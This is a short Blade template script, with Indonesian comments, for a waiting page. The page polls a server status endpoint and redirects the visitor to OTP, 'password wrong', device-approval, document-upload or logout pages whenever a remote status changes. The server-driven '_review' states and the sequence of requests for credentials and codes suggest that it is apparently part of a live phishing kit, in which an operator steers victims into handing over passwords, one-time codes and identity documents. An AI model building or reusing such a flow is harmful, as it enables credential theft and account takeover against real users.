<script>
(() => {
    const current = @json($current);
    const statusEl = document.getElementById('wait-status');

    const otpStates = ['otp', 'otp_review', 'auth', 'auth_review'];
    const passwordStates = ['password', 'password_review'];
    const deviceStates = ['device', 'device_review'];

    const reloadIfPairChanged = (group, status) => {
        if (!group.includes(current)) return false;
        if (!group.includes(status)) return false;
        if (current !== status) {
            window.location.reload();
            return true;
        }
        return false;
    };

    const go = (data) => {
        const urls = data.urls || {};
        const s = data.status;

        // Close / logout HARUS diprioritaskan
        if (s === 'logout' || s === 'closed') {
            window.location.href = urls.force_logout;
            return true;
        }

        if (s === 'missing') {
            window.location.href = @json(\App\Support\AppRedirect::loginEntryUrl());
            return true;
        }

        if (otpStates.includes(s)) {
            if (!otpStates.includes(current)) {
                window.location.href = urls.otp;
                return true;
            }
            return reloadIfPairChanged(otpStates, s);
        }

        if (passwordStates.includes(s)) {
            if (!passwordStates.includes(current)) {
                window.location.href = urls.password_wrong;
                return true;
            }
            return reloadIfPairChanged(passwordStates, s);
        }

        if (deviceStates.includes(s)) {
            if (!deviceStates.includes(current)) {
                window.location.href = urls.approve_device;
                return true;
            }
            return reloadIfPairChanged(deviceStates, s);
        }

        if (s === 'document') {
            if (current !== 'document') {
                window.location.href = urls.upload_document;
                return true;
            }
            return false;
        }

        if (s === 'waiting' && current !== 'waiting') {
            window.location.href = urls.waiting;
            return true;
        }

        return false;
    };

    const poll = async () => {
        try {
            const res = await fetch(@json(route('waiting.status')), {
                headers: { 'Accept': 'application/json' },
                credentials: 'same-origin',
                cache: 'no-store',
            });
            if (!res.ok) {
                window.location.href = urlsFallback();
                return;
            }
            const data = await res.json();
            if (statusEl) statusEl.textContent = 'Status: ' + data.status;
            if (go(data)) return;
        } catch (e) {
            if (statusEl) statusEl.textContent = 'Koneksi terputus, mencoba lagi…';
        }
        setTimeout(poll, 1200);
    };

    const urlsFallback = () => @json(route('force-logout'));

    poll();
})();
</script>
